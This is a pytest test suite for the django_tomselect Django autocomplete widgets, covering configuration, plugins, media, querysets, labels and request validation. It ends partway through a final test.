"""Tests for TomSelectModelWidget and TomSelectModelMultipleWidget."""

import logging
import time
from dataclasses import FrozenInstanceError

import pytest
from bs4 import BeautifulSoup
from django.core.cache import cache
from django.core.exceptions import ValidationError
from django.urls import reverse_lazy
from django.urls.exceptions import NoReverseMatch
from django.utils.translation import gettext as _
from django.utils.translation import gettext_lazy as _lazy

from django_tomselect.app_settings import (
    PluginCheckboxOptions,
    PluginClearButton,
    PluginDropdownFooter,
    PluginDropdownHeader,
    PluginDropdownInput,
    PluginRemoveButton,
    TomSelectConfig,
    bool_or_callable,
    merge_configs,
)
from django_tomselect.autocompletes import AutocompleteModelView
from django_tomselect.cache import permission_cache
from django_tomselect.lazy_utils import LazyView
from django_tomselect.widgets import (
    TomSelectIterablesMultipleWidget,
    TomSelectIterablesWidget,
    TomSelectModelMultipleWidget,
    TomSelectModelWidget,
)
from example_project.example.models import (
    ArticlePriority,
    ArticleStatus,
    Edition,
    Magazine,
    edition_year,
    word_count_range,
)


@pytest.mark.django_db
class TestTomSelectModelWidget:
    """Tests for TomSelectModelWidget."""

    @pytest.fixture(autouse=True)
    def setup_test(self):
        """Set up test environment."""
        self.basic_config = TomSelectConfig(
            url="autocomplete-edition",
            value_field="id",
            label_field="name",
        )
        self.widget_class = TomSelectModelWidget

    def create_widget(self, config=None, **kwargs):
        """Helper method to create widget instances."""
        widget = self.widget_class(config=config or self.basic_config, **kwargs)
        # Initialize the widget with ModelChoiceField's choices
        return widget

    def test_widget_initialization(self):
        """Test basic widget initialization."""
        widget = self.create_widget()
        assert widget.url == "autocomplete-edition"
        assert widget.value_field == "id"
        assert widget.label_field == "name"

    def test_widget_initialization_with_custom_config(self):
        """Test widget initialization with custom config."""
        config = TomSelectConfig(
            url="custom-url",
            value_field="custom_id",
            label_field="custom_name",
            highlight=False,
            placeholder="Custom placeholder",
        )
        widget = self.create_widget(config=config)
        assert widget.url == "custom-url"
        assert widget.value_field == "custom_id"
        assert widget.label_field == "custom_name"
        assert widget.highlight is False
        assert widget.placeholder == "Custom placeholder"

    def test_widget_media(self):
        """Test widget media (CSS and JavaScript) generation."""
        widget = self.create_widget()
        media = widget.media

        # Check CSS files
        assert any("tom-select.default.css" in css for css in media._css["all"])
        assert any("django-tomselect.css" in css for css in media._css["all"])

        # Check JavaScript files
        assert any("django-tomselect.js" in js or "django-tomselect.min.js" in js for js in media._js)

    @pytest.mark.parametrize(
        "css_framework,expected_css",
        [
            ("default", "tom-select.default.css"),
            ("bootstrap4", "tom-select.bootstrap4.css"),
            ("bootstrap5", "tom-select.bootstrap5.css"),
        ],
    )
    def test_css_framework_handling(self, css_framework, expected_css):
        """Test correct CSS file selection based on Bootstrap version."""
        config = TomSelectConfig(css_framework=css_framework)
        widget = self.create_widget(config=config)
        media = widget.media
        assert any(expected_css in css for css in media._css["all"])

    def test_build_attrs(self):
        """Test HTML attribute generation."""
        widget = self.create_widget()
        attrs = widget.build_attrs({})

        # Check data attributes
        assert "data-autocomplete-url" in attrs
        assert attrs["data-value-field"] == "id"
        assert attrs["data-label-field"] == "name"

    def test_get_context_with_tabular_display(self, sample_edition):
        """Test context generation with tabular display configuration."""
        config = TomSelectConfig(
            url="autocomplete-edition",
            plugin_dropdown_header=PluginDropdownHeader(
                show_value_field=True, extra_columns={"year": "Year", "pages": "Pages"}
            ),
        )
        widget = self.create_widget(config=config)
        context = widget.get_context("test", None, {})

        assert context["widget"]["is_tabular"]
        assert "plugins" in context["widget"]
        assert "dropdown_header" in context["widget"]["plugins"]

    def test_get_context_with_initial_value(self, sample_edition):
        """Test context generation with initial value."""
        widget = self.create_widget()
        context = widget.get_context("test", sample_edition.pk, {})

        assert "widget" in context
        assert context["widget"]["value"] == sample_edition.pk

    def test_get_autocomplete_url(self):
        """Test autocomplete URL generation."""
        widget = self.create_widget()
        url = widget.get_autocomplete_url()
        assert url == reverse_lazy("autocomplete-edition")

    def test_get_queryset(self, sample_edition):
        """Test queryset retrieval."""
        widget = self.create_widget()
        queryset = widget.get_queryset()
        assert queryset.model == Edition
        assert sample_edition in queryset

    @pytest.mark.parametrize(
        "plugin_config,expected_plugins",
        [
            (
                {
                    "url": "autocomplete-edition",
                    "plugin_checkbox_options": PluginCheckboxOptions(),
                },
                ["checkbox_options"],
            ),
            (
                {
                    "url": "autocomplete-edition",
                    "plugin_clear_button": PluginClearButton(),
                },
                ["clear_button"],
            ),
            (
                {
                    "url": "autocomplete-edition",
                    "plugin_checkbox_options": PluginCheckboxOptions(),
                    "plugin_clear_button": PluginClearButton(),
                },
                ["checkbox_options", "clear_button"],
            ),
        ],
    )
    def test_plugin_configurations(self, plugin_config, expected_plugins):
        """Test various plugin configurations."""
        config = TomSelectConfig(**plugin_config)
        widget = self.create_widget(config=config)
        context = widget.get_context("test", None, {})

        for plugin in expected_plugins:
            assert plugin in context["widget"]["plugins"]

    def test_get_label_for_object_with_none_label(self, sample_edition):
        """Test label handling when label field returns None."""
        widget = TomSelectModelWidget(
            config=TomSelectConfig(url="autocomplete-edition", label_field="nonexistent_field")
        )

        class MockView:
            """Mock view for testing."""

            def prepare_nonexistent_field(self, obj):
                """Mock method for testing."""
                return None

        label = widget.get_label_for_object(sample_edition, MockView())
        assert label == str(sample_edition)

    def test_plugin_config_with_none(self):
        """Test plugin configuration when all plugins are None."""
        widget = TomSelectModelWidget(
            config=TomSelectConfig(
                url="autocomplete-edition",
                plugin_checkbox_options=None,
                plugin_clear_button=None,
                plugin_dropdown_header=None,
                plugin_dropdown_footer=None,
                plugin_dropdown_input=None,
                plugin_remove_button=None,
            )
        )
        plugins = widget.get_plugin_context()
        assert "checkbox_options" in plugins
        assert plugins["checkbox_options"] is False
        assert "dropdown_input" in plugins
        assert plugins["dropdown_input"] is False

    def test_widget_with_create_option_and_filter(self):
        """Test widget initialization with create option and filter."""
        config = TomSelectConfig(
            url="autocomplete-edition",
            show_create=True,
            create_field="name",
            filter_by=("magazine", "magazine_id"),
        )
        widget = self.create_widget(config=config)
        context = widget.get_context("test", None, {})

        assert context["widget"]["dependent_field"] == "magazine"
        assert context["widget"]["dependent_field_lookup"] == "magazine_id"

    def test_widget_with_create_option_and_validation_error(self):
        """Test widget initialization with create option and validation error."""
        config = TomSelectConfig(
            url="autocomplete-edition",
            show_create=True,
            create_field="name",
        )
        widget = self.create_widget(config=config)
        context = widget.get_context("test", "", {})

        assert context["widget"]["selected_options"] == []

    def test_widget_with_tabular_layout_and_extra_columns(self):
        """Test widget with tabular layout and extra columns."""
        widget = TomSelectModelWidget(
            config=TomSelectConfig(
                url="autocomplete-edition",
                plugin_dropdown_header=PluginDropdownHeader(
                    show_value_field=True,
                    title="Select Edition",
                    extra_columns={"year": "Publication Year", "pub_num": "Publication Number"},
                ),
            )
        )
        context = widget.get_context("test", None, {})
        header = context["widget"]["plugins"]["dropdown_header"]
        assert header["show_value_field"]
        assert "Publication Year" in header["extra_headers"]
        assert "pub_num" in header["extra_values"]

    def test_widget_with_dynamic_attributes(self):
        """Test widget with dynamically generated attributes."""

        class DynamicWidget(TomSelectModelWidget):
            """Widget with dynamic attributes."""

            def get_context(self, name, value, attrs):
                """Add a timestamp to the widget."""
                attrs = attrs or {}
                attrs["data-timestamp"] = str(int(time.time()))
                return super().get_context(name, value, attrs)

        widget = DynamicWidget(config=TomSelectConfig(url="autocomplete-edition"))

        rendered1 = widget.render("test", None)
        time.sleep(1)
        rendered2 = widget.render("test", None)

        # Get the rendered select elements
        soup1 = BeautifulSoup(rendered1, "html.parser")
        soup2 = BeautifulSoup(rendered2, "html.parser")

        select1 = soup1.find("select")
        select2 = soup2.find("select")

        # Check timestamps differ
        assert select1["data-timestamp"] != select2["data-timestamp"]


@pytest.mark.django_db
class TestTomSelectModelMultipleWidget:
    """Tests for TomSelectModelMultipleWidget."""

    @pytest.fixture(autouse=True)
    def setup_test(self):
        """Set up test environment."""
        self.basic_config = TomSelectConfig(
            url="autocomplete-edition",
            value_field="id",
            label_field="name",
        )
        self.widget_class = TomSelectModelWidget

    @pytest.fixture
    def setup_multiple_widget(self):
        """Set up multiple select widget for testing."""

        def _create_widget(config=None):
            if config is None:
                config = TomSelectConfig(url="autocomplete-edition")
            widget = TomSelectModelMultipleWidget(config=config)
            return widget

        return _create_widget

    def test_multiple_widget_initialization(self, setup_multiple_widget):
        """Test multiple select widget initialization."""
        assert hasattr(setup_multiple_widget(), "allow_multiple_selected")
        assert setup_multiple_widget().allow_multiple_selected

    def test_multiple_widget_build_attrs(self, setup_multiple_widget):
        """Test HTML attribute generation for multiple select."""
        attrs = setup_multiple_widget().build_attrs({})
        assert attrs.get("is-multiple") is True

    def test_multiple_widget_get_context(self, setup_multiple_widget):
        """Test context generation for multiple select."""
        context = setup_multiple_widget().get_context("test", None, {})
        assert context["widget"]["is_multiple"]

    def test_multiple_widget_with_initial_values(self, editions, setup_multiple_widget):
        """Test context generation with initial values for multiple select."""
        initial_values = [editions[0].pk, editions[1].pk]
        context = setup_multiple_widget().get_context("test", initial_values, {})

        assert "widget" in context

    def test_multiple_widget_with_max_items_none(self, setup_multiple_widget):
        """Test multiple widget with unlimited selections."""
        config = TomSelectConfig(url="autocomplete-edition", max_items=None)
        widget = setup_multiple_widget(config)
        context = widget.get_context("test", None, {})
        assert context["widget"]["max_items"] is None

    def test_multiple_widget_empty_selection(self, setup_multiple_widget):
        """Test multiple widget with empty selection."""
        widget = setup_multiple_widget()
        context = widget.get_context("test", [], {})
        assert context["widget"]["selected_options"] == []

    def test_invalid_selected_values(self, setup_multiple_widget):
        """Test handling of invalid selected values."""
        context = setup_multiple_widget().get_context("test", [999999, 888888], {})
        # Since invalid values result in empty queryset, selected_options is an empty list
        assert context["widget"]["selected_options"] == []


@pytest.mark.django_db
class TestTomSelectWidget:
    """Tests for TomSelectIterablesWidget with TextChoices."""

    @pytest.fixture(autouse=True)
    def setup_test(self):
        """Set up test environment."""
        self.basic_config = TomSelectConfig(
            url="autocomplete-article-status",
            value_field="value",
            label_field="label",
        )
        self.widget_class = TomSelectIterablesWidget

    def test_widget_with_text_choices(self):
        """Test widget initialization with TextChoices."""
        widget = self.widget_class(config=self.basic_config)
        context = widget.get_context("test", ArticleStatus.DRAFT, {})

        assert "widget" in context
        assert context["widget"]["value"] == ArticleStatus.DRAFT
        assert "selected_options" in context["widget"]
        selected = context["widget"]["selected_options"]
        assert len(selected) == 1
        assert selected[0]["value"] == ArticleStatus.DRAFT
        assert selected[0]["label"] == ArticleStatus.DRAFT.label

    def test_widget_with_integer_choices(self):
        """Test widget with IntegerChoices."""
        widget = self.widget_class(
            config=TomSelectConfig(
                url="autocomplete-article-priority",
                value_field="value",
                label_field="label",
            )
        )
        context = widget.get_context("test", ArticlePriority.NORMAL, {})

        assert context["widget"]["value"] == ArticlePriority.NORMAL
        selected = context["widget"]["selected_options"]
        assert selected[0]["value"] == str(ArticlePriority.NORMAL)
        assert selected[0]["label"] == ArticlePriority.NORMAL.label

    def test_widget_with_tuple_iterable(self):
        """Test widget with tuple iterable (word_count_range)."""
        widget = self.widget_class(
            config=TomSelectConfig(
                url="autocomplete-page-count",
                value_field="value",
                label_field="label",
            )
        )
        # Convert word_count_range tuples to choices format
        widget.choices = [(str(r), f"{r[0]}-{r[1]}") for r in word_count_range]
        value = str(word_count_range[0])  # First range as string
        context = widget.get_context("test", value, {})

        assert context["widget"]["value"] == value
        selected = context["widget"]["selected_options"]
        assert len(selected) == 1
        assert selected[0]["value"] == value

    def test_widget_with_simple_iterable(self):
        """Test widget with simple iterable (edition_year)."""
        widget = self.widget_class(
            config=TomSelectConfig(
                url="autocomplete-edition-year",
                value_field="value",
                label_field="label",
            )
        )
        widget.choices = [(str(y), str(y)) for y in edition_year]
        value = str(edition_year[0])
        context = widget.get_context("test", value, {})

        assert context["widget"]["value"] == value
        selected = context["widget"]["selected_options"]
        assert selected[0]["value"] == value
        assert selected[0]["label"] == str(edition_year[0])

    def test_widget_get_iterable(self):
        """Test retrieval of iterable items."""
        widget = self.widget_class(config=self.basic_config)
        iterable = widget.get_iterable()

        assert len(iterable) == len(ArticleStatus.choices)
        assert all(isinstance(item, dict) for item in iterable)
        assert all("value" in item and "label" in item for item in iterable)


@pytest.mark.django_db
class TestTomSelectMultipleWidgetIterables:
    """Tests for TomSelectIterablesMultipleWidget with iterables."""

    @pytest.fixture
    def multiple_widget(self):
        """Create multiple select widget."""
        config = TomSelectConfig(
            url="autocomplete-article-status",
            value_field="value",
            label_field="label",
            max_items=None,
        )
        widget = TomSelectIterablesMultipleWidget(config=config)
        return widget

    def test_multiple_widget_multiple_values(self, multiple_widget):
        """Test multiple widget with multiple selected values."""
        values = [ArticleStatus.DRAFT, ArticleStatus.ACTIVE]
        context = multiple_widget.get_context("test", values, {})

        assert "widget" in context
        assert context["widget"]["is_multiple"]
        selected = context["widget"]["selected_options"]
        assert len(selected) == 2
        assert {opt["value"] for opt in selected} == {str(v) for v in values}


@pytest.mark.django_db
class TestWidgetErrorAndURLHandling:
    """Test error handling in widget initialization and configuration."""

    @pytest.fixture
    def setup_widget(self):
        """Set up base widget for testing."""

        def _create_widget(config):
            widget = TomSelectModelWidget(config=config)
            return widget

        return _create_widget

    def test_filter_by_validation(self):
        """Test validation of filter_by configuration."""
        with pytest.raises(ValidationError):
            TomSelectConfig(filter_by=("field",)).validate()

    def test_exclude_by_validation(self):
        """Test validation of exclude_by configuration."""
        with pytest.raises(ValidationError):
            TomSelectConfig(exclude_by=("field",)).validate()

    def test_same_filter_exclude_fields(self):
        """Test validation when filter_by and exclude_by reference same field."""
        with pytest.raises(ValidationError):
            TomSelectConfig(filter_by=("field", "lookup"), exclude_by=("field", "lookup")).validate()

    def test_get_url_with_reverse_error(self, monkeypatch):
        """Test URL generation with reverse error."""

        def mock_reverse_lazy(*args, **kwargs):
            raise NoReverseMatch("Test error")

        monkeypatch.setattr("django_tomselect.widgets.safe_reverse_lazy", mock_reverse_lazy)

        widget = TomSelectModelWidget()
        result = widget.get_url("nonexistent-url", "test url")
        assert result == ""

    def test_invalid_url_handling(self, setup_widget):
        """Test handling of invalid URLs."""
        widget = setup_widget(TomSelectConfig(url="non-existent-url"))
        with pytest.raises(NoReverseMatch):
            _ = widget.get_autocomplete_url() == ""


@pytest.mark.django_db
class TestWidgetQuerysetAndDependencies:
    """Test dependent field functionality."""

    @pytest.fixture
    def setup_dependent_widget(self):
        """Set up widget with dependent field configuration."""
        widget = TomSelectModelWidget(
            config=TomSelectConfig(url="autocomplete-edition", filter_by=("magazine", "magazine_id"))
        )
        return widget

    @pytest.fixture
    def setup_test_data(self):
        """Create test editions and magazine."""
        magazine = Magazine.objects.create(name="Test Magazine")
        edition1 = Edition.objects.create(name="Edition 1", year="2023", magazine=magazine)
        edition2 = Edition.objects.create(name="Edition 2", year="2024", magazine=magazine)
        return magazine, [edition1, edition2]

    @pytest.fixture
    def setup_widget(self):
        """Create properly initialized widget."""

        def _create_widget(config=None):
            if config is None:
                config = TomSelectConfig(url="autocomplete-edition")
            widget = TomSelectModelWidget(config=config)
            return widget

        return _create_widget

    @pytest.fixture
    def setup_complex_widget(self, sample_magazine):
        """Create widget with complex configuration."""
        config = TomSelectConfig(
            url="autocomplete-edition",
            filter_by=("magazine", "id"),
            plugin_dropdown_header=PluginDropdownHeader(extra_columns={"year": "Year", "pub_num": "Publication"}),
        )
        widget = TomSelectModelWidget(config=config)
        return widget

    def test_dependent_field_context(self, setup_dependent_widget):
        """Test context generation with dependent field."""
        context = setup_dependent_widget.get_context("test", None, {})
        assert "dependent_field" in context["widget"]
        assert context["widget"]["dependent_field"] == "magazine"
        assert context["widget"]["dependent_field_lookup"] == "magazine_id"

    def test_get_queryset(self, setup_widget, setup_test_data):
        """Test queryset retrieval."""
        widget = setup_widget()
        queryset = widget.get_queryset()
        assert queryset.model == Edition
        assert queryset.count() == 2

    def test_filtered_queryset(self, setup_complex_widget, editions):
        """Test queryset with filtering applied."""
        queryset = setup_complex_widget.get_queryset()
        assert queryset.model == Edition
        assert all(edition.magazine is not None for edition in queryset)

    def test_existing_search_lookups(self, setup_complex_widget):
        """Test behavior for EditionAutocompleteView, where `search_lookups = ["name__icontains"]`."""
        lookups = setup_complex_widget.get_search_lookups()
        assert isinstance(lookups, list)
        assert len(lookups) == 1

    def test_get_autocomplete_params_no_view(self, setup_dependent_widget):
        """Test get_autocomplete_params when no view is available."""
        widget = setup_dependent_widget
        widget.get_autocomplete_view = lambda: None
        params = widget.get_autocomplete_params()
        assert params == ""

    def test_get_model_from_choices_model(self):
        """Test get_model when choices has model attribute."""
        widget = TomSelectModelWidget(config=TomSelectConfig(url="autocomplete-edition"))
        widget.choices = type("MockChoices", (), {"model": Edition})()
        assert widget.get_model() == Edition


@pytest.mark.django_db
class TestWidgetContextAndRendering:
    """Test context preparation with various configurations."""

    @pytest.fixture
    def setup_widget(self):
        """Create properly initialized widget."""

        def _create_widget(config):
            widget = TomSelectModelWidget(config=config)
            return widget

        return _create_widget

    def test_context_with_plugins(self, setup_widget):
        """Test context generation with all plugins enabled."""
        config = TomSelectConfig(
            url="autocomplete-edition",
            plugin_checkbox_options=PluginCheckboxOptions(),
            plugin_clear_button=PluginClearButton(title="Clear All"),
            plugin_dropdown_header=PluginDropdownHeader(title="Select Item"),
            plugin_dropdown_footer=PluginDropdownFooter(),
            plugin_dropdown_input=PluginDropdownInput(),
            plugin_remove_button=PluginRemoveButton(title="Remove"),
        )
        widget = setup_widget(config)
        context = widget.get_context("test", None, {})

        assert "plugins" in context["widget"]
        plugins = context["widget"]["plugins"]
        assert plugins.get("checkbox_options") is True
        assert "clear_button" in plugins
        assert plugins["clear_button"]["title"] == "Clear All"
        assert "dropdown_header" in plugins
        assert plugins["dropdown_header"]["title"] == "Select Item"
        assert "dropdown_footer" in plugins
        assert plugins.get("dropdown_input") is True
        assert "remove_button" in plugins
        assert plugins["remove_button"]["title"] == "Remove"

    def test_context_with_custom_attributes(self, setup_widget):
        """Test context generation with custom attributes."""
        config = TomSelectConfig(
            url="autocomplete-edition",
            placeholder="Custom placeholder",
            highlight=True,
            max_items=5,
        )
        widget = setup_widget(config)
        attrs = {"class": "custom-class", "data-test": "test"}
        context = widget.get_context("test", None, attrs)

        assert context["widget"]["attrs"]["class"] == "custom-class"
        assert context["widget"]["attrs"]["data-test"] == "test"
        assert context["widget"]["placeholder"] == "Custom placeholder"

    def test_render_with_htmx(self, setup_widget):
        """Test widget rendering with HTMX enabled."""
        config = TomSelectConfig(url="autocomplete-edition", use_htmx=True)
        widget = setup_widget(config)
        rendered = widget.render("test", None)
        # HTMX enabled widgets don't wait for DOMContentLoaded
        assert "DOMContentLoaded" not in rendered
        # Verify it's still a functional widget
        assert "<select" in rendered
        assert "TomSelect" in rendered

    def test_render_with_custom_id(self, setup_widget):
        """Test widget rendering with custom ID attribute."""
        config = TomSelectConfig(url="autocomplete-edition")
        widget = setup_widget(config)
        rendered = widget.render("test", None, attrs={"id": "custom-id"})
        assert 'id="custom-id"' in rendered


@pytest.mark.django_db
class TestWidgetConfigurationAndMedia:
    """Test configuration validation for widgets."""

    def test_dropdown_header_validation(self):
        """Test validation of PluginDropdownHeader configuration."""
        with pytest.raises(ValidationError):
            PluginDropdownHeader(extra_columns="invalid")

    def test_config_combination_validation(self):
        """Test validation of combined configurations."""
        with pytest.raises(ValidationError):
            TomSelectConfig(filter_by=("field", "lookup"), exclude_by=("field", "lookup"))

    def test_bool_or_callable_with_callable(self):
        """Test bool_or_callable with a callable."""

        def callable_func():
            return True

        result = bool_or_callable(callable_func)
        assert result is True

    def test_plugin_configuration_warnings(self, caplog):
        """Test plugin configuration type verification warnings."""
        caplog.set_level(logging.WARNING)

        # Create a new config with invalid plugin types
        invalid_config = TomSelectConfig(
            plugin_checkbox_options=type("InvalidPlugin", (), {})(),
            plugin_clear_button=type("InvalidPlugin", (), {})(),
            plugin_dropdown_header=type("InvalidPlugin", (), {})(),
            plugin_dropdown_footer=type("InvalidPlugin", (), {})(),
            plugin_dropdown_input=type("InvalidPlugin", (), {})(),
            plugin_remove_button=type("InvalidPlugin", (), {})(),
        )

        invalid_config.verify_config_types()

        # Verify warnings were logged
        assert len([r for r in caplog.records if r.levelname == "WARNING"]) == 6
        assert any("PluginCheckboxOptions is not of type PluginCheckboxOptions" in r.message for r in caplog.records)

    @pytest.mark.parametrize(
        "use_minified,expected_suffix",
        [
            (True, ".min."),
            (False, "."),
        ],
    )
    def test_media_minification(self, use_minified, expected_suffix):
        """Test proper handling of minified and non-minified assets."""
        config = TomSelectConfig(use_minified=use_minified)
        widget = TomSelectModelWidget(config=config)
        media = widget.media

        # Check CSS files
        css_files = media._css["all"]
        assert any(expected_suffix in f for f in css_files)

        # Check JS files
        js_files = media._js
        assert any(expected_suffix in f for f in js_files)

    def test_field_with_conditional_configuration(self, sample_edition):
        """Test widget configuration that changes based on conditions."""
        from django.conf import settings  # pylint: disable=C0415

        def get_config():
            if settings.DEBUG:
                return TomSelectConfig(url="autocomplete-edition", preload=True, minimum_query_length=1)
            return TomSelectConfig(url="autocomplete-edition", preload=False, minimum_query_length=2)

        widget = TomSelectModelWidget(config=get_config())
        assert widget.minimum_query_length in (1, 2)
        assert isinstance(widget.preload, bool)

    def test_widget_with_htmx_configuration(self):
        """Test widget configuration with HTMX support."""
        widget = TomSelectModelWidget(
            config=TomSelectConfig(url="autocomplete-edition", use_htmx=True, create_with_htmx=True)
        )
        context = widget.get_context("test", None, {})

        # Verify HTMX config in context
        assert context["widget"]["use_htmx"]
        assert context["widget"]["create_with_htmx"]

        # Test the rendered output doesn't include DOMContentLoaded wrapper
        rendered = widget.render("test", None)
        assert "DOMContentLoaded" not in rendered


@pytest.mark.django_db
class TestWidgetInitializationAndAttributes:
    """Test edge cases in widget initialization."""

    @pytest.fixture
    def widget_with_attrs(self):
        """Create widget with predefined attributes."""
        config = TomSelectConfig(
            url="autocomplete-edition",
            attrs={"class": "base-class", "data-test": "base"},
        )
        widget = TomSelectModelWidget(config=config)
        return widget

    @pytest.fixture
    def setup_widget(self):
        """Set up base widget for testing."""

        def _create_widget(config=None):
            if config is None:
                config = TomSelectConfig(url="autocomplete-edition")
            widget = TomSelectModelWidget(config=config)
            return widget

        return _create_widget

    def test_initialization_with_overrides(self):
        """Test widget initialization with kwargs overriding config."""
        config = TomSelectConfig(url="original-url")
        # Remove url from kwargs since it's not a valid widget attribute
        widget = TomSelectModelWidget(config=config)
        widget.url = "overridden-url"  # After initialization!
        assert widget.url == "overridden-url"

    def test_initialization_with_invalid_attrs(self):
        """Test widget initialization with invalid attributes."""
        widget = TomSelectModelWidget()
        widget.attrs = {}  # Test setting attrs directly on widget
        assert isinstance(widget.attrs, dict)

    def test_data_attributes(self, widget_with_attrs):
        """Test handling of data-* attributes."""
        attrs = widget_with_attrs.build_attrs({}, {"data-custom": "value"})
        assert attrs["data-custom"] == "value"
        assert "data-autocomplete-url" in attrs

    def test_widget_with_invalid_value(self, setup_widget):
        """Test widget behavior with invalid value."""
        widget = setup_widget()
        context = widget.get_context("test", 99999, {})  # Non-existent ID
        # Invalid IDs should result in empty selected_options
        assert context["widget"]["selected_options"] == []

    def test_exclusion_and_filtering(self, setup_widget):
        """Test widget with both exclude_by and filter_by configurations."""
        config = TomSelectConfig(
            url="autocomplete-edition",
            filter_by=("magazine", "magazine_id"),
            exclude_by=("author", "author_id"),
        )
        widget = setup_widget(config)
        context = widget.get_context("test", None, {})
        assert context["widget"]["dependent_field"] == "magazine"
        assert context["widget"]["exclude_field"] == "author"

    def test_merge_config_dict_attributes(self):
        """Test merging of dictionary attributes in config."""
        base_attrs = {"class": "base", "data-test": "base"}
        config = TomSelectConfig(url="autocomplete-edition", attrs=base_attrs)
        widget = TomSelectModelWidget(config=config)

        # Create copy of attrs to avoid modifying original
        widget_attrs = widget.attrs.copy()
        widget_attrs.update(base_attrs)

        # Verify base attrs are present
        assert widget_attrs["class"] == "base"
        assert widget_attrs["data-test"] == "base"

        # Test merging new attrs
        merged_attrs = widget.build_attrs(widget_attrs, {"class": "override", "data-new": "new"})
        assert merged_attrs["class"] == "override"
        assert merged_attrs["data-test"] == "base"
        assert merged_attrs["data-new"] == "new"

    def test_config_frozen_instance(self):
        """Test that TomSelectConfig is immutable after creation."""
        config = TomSelectConfig(url="autocomplete-edition", placeholder="Original")

        # Verify we cannot modify the frozen instance
        with pytest.raises(FrozenInstanceError):
            config.placeholder = "New Placeholder"


@pytest.mark.django_db
class TestWidgetValidation:
    """Test Validation and handling for non-model widgets."""

    def test_url_validation(self):
        """Test URL validation during widget initialization."""
        from django.urls.exceptions import NoReverseMatch

        widget = TomSelectIterablesWidget(config=TomSelectConfig(url=""))

        with pytest.raises(NoReverseMatch):
            widget.get_autocomplete_url()

    def test_url_with_parameters(self):
        """Test URL generation with parameters."""
        widget = TomSelectIterablesWidget(
            config=TomSelectConfig(
                url="autocomplete-article-status",
                value_field="value",
                label_field="label",
            )
        )
        url = widget.get_autocomplete_url()
        expected_url = reverse_lazy("autocomplete-article-status")
        assert url == expected_url

    def test_widget_invalid_config(self):
        """Test widget initialization with invalid config."""
        with pytest.raises(TypeError):
            TomSelectIterablesWidget(config="invalid")

    def test_get_autocomplete_view_validation(self):
        """Test validation of autocomplete view."""
        widget = TomSelectIterablesWidget(config=TomSelectConfig(url="autocomplete-article-status"))
        view = widget.get_autocomplete_view()
        assert hasattr(view, "get_iterable")
        assert callable(view.get_iterable)


@pytest.mark.django_db
class TestWidgetModelAndLabelHandling:
    """Test object label handling in TomSelect widgets."""

    @pytest.fixture
    def mock_autocomplete_view(self, editions):
        """Create mock autocomplete view for testing."""

        class MockView:
            """Mock autocomplete view for testing."""

            create_url = "test-create"
            detail_url = "test-detail"
            update_url = "test-update"
            delete_url = "test-delete"
            search_lookups = []  # Add required attribute

            def get_queryset(self):
                """Return all editions."""
                return Edition.objects.all()

        return MockView()

    def test_get_label_for_object_with_prepare_method(self, sample_edition):
        """Test get_label_for_object when view has prepare method."""

        class MockView:
            """Mock view with prepare method."""

            def prepare_custom_label(self, obj):
                """Prepare custom label."""
                return f"Prepared {obj.name}"

        widget = TomSelectModelWidget()
        widget.label_field = "custom_label"
        label = widget.get_label_for_object(sample_edition, MockView())
        assert label == f"Prepared {sample_edition.name}"

    def test_get_label_for_object_with_attribute_error(self, sample_edition):
        """Test get_label_for_object when attribute access fails."""
        widget = TomSelectModelWidget()
        widget.label_field = "nonexistent_field"
        label = widget.get_label_for_object(sample_edition, None)
        assert label == str(sample_edition)

    def test_get_model_with_list_choices(self):
        """Test get_model with list choices."""
        widget = TomSelectModelWidget()
        widget.choices = [("1", "One"), ("2", "Two")]
        assert widget.get_model() is None

    def test_get_model_with_empty_choices(self):
        """Test get_model with empty choices."""
        widget = TomSelectModelWidget()
        widget.choices = []
        assert widget.get_model() is None

    def test_selected_options_with_invalid_urls(self, mock_autocomplete_view, sample_edition, monkeypatch):
        """Test handling of invalid URLs in selected options."""
        widget = TomSelectModelWidget(
            config=TomSelectConfig(show_create=True, show_detail=True, show_update=True, show_delete=True)
        )
        widget.get_autocomplete_view = lambda: mock_autocomplete_view

        def mock_reverse(*args, **kwargs):
            raise NoReverseMatch("Test error")

        monkeypatch.setattr("django_tomselect.widgets.safe_reverse", mock_reverse)

        context = widget.get_context("test", sample_edition.pk, {})
        selected = context["widget"]["selected_options"]

        assert "create_url" not in selected
        assert "detail_url" not in selected
        assert "update_url" not in selected
        assert "delete_url" not in selected


@pytest.mark.django_db
class TestIterablesWidgetEdgeCases:
    """Test edge cases for TomSelectIterablesWidget."""

    def test_widget_with_invalid_value(self):
        """Test widget handling of invalid values."""
        widget = TomSelectIterablesWidget(config=TomSelectConfig(url="autocomplete-article-status"))
        context = widget.get_context("test", "invalid_value", {})
        assert "selected_options" in context["widget"]
        assert context["widget"]["selected_options"][0]["value"] == "invalid_value"
        assert context["widget"]["selected_options"][0]["label"] == "invalid_value"

    def test_widget_with_tuple_iterable_invalid_format(self):
        """Test widget with malformed tuple iterable."""
        widget = TomSelectIterablesWidget()

        class MockView:
            """Mock view with invalid tuple format."""

            iterable = [(1,)]  # Invalid tuple format

            def setup(self, request):
                """Mock setup method."""

        widget.get_autocomplete_view = lambda: MockView()
        context = widget.get_context("test", "1", {})
        assert "selected_options" in context["widget"]
        assert context["widget"]["selected_options"][0]["value"] == "1"


@pytest.mark.django_db
class TestWidgetRequestHandlingAndUpdates:
    """Test request handling, field changes and updates in TomSelect widgets."""

    @pytest.fixture
    def setup_widget(self):
        """Create properly initialized widget."""

        def _create_widget(config=None):
            if config is None:
                config = TomSelectConfig(url="autocomplete-edition")
            widget = TomSelectModelWidget(config=config)
            return widget

        return _create_widget

    def test_validate_request_missing_attributes(self, setup_widget):
        """Test request validation with missing attributes."""
        widget = setup_widget()

        class InvalidRequest:
            """Mock request missing required attributes."""

        assert not widget.validate_request(InvalidRequest())

    def test_validate_request_missing_user_auth(self, setup_widget):
        """Test request validation with missing user authentication."""
        widget = setup_widget()

        class PartialRequest:
            """Mock request with incomplete user attributes."""

            method = "GET"
            GET = {}
            user = type("MockUser", (), {})()

            def get_full_path(self):
                """Mock get_full_path method."""
                return "/test/"

        assert not widget.validate_request(PartialRequest())

    def test_validate_request_valid(self, setup_widget):
        """Test request validation with valid request object."""
        widget = setup_widget()

        class ValidRequest:
            """Mock request with all required attributes."""

            method = "GET"
            GET = {}

            class User:
                """Mock user object."""

                is_authenticated = True

            user = User()

            def get_full_path(self):
                """Mock get_full_path method."""
                return "/test/"

        assert widget.validate_request(ValidRequest())

    @pytest.mark.parametrize(
        "method_name",
        [
            "get_full_path",
        ],
    )
    def test_validate_request_missing_methods(self, setup_widget, method_name):
        """Test request validation with missing required methods."""
        widget = setup_widget()

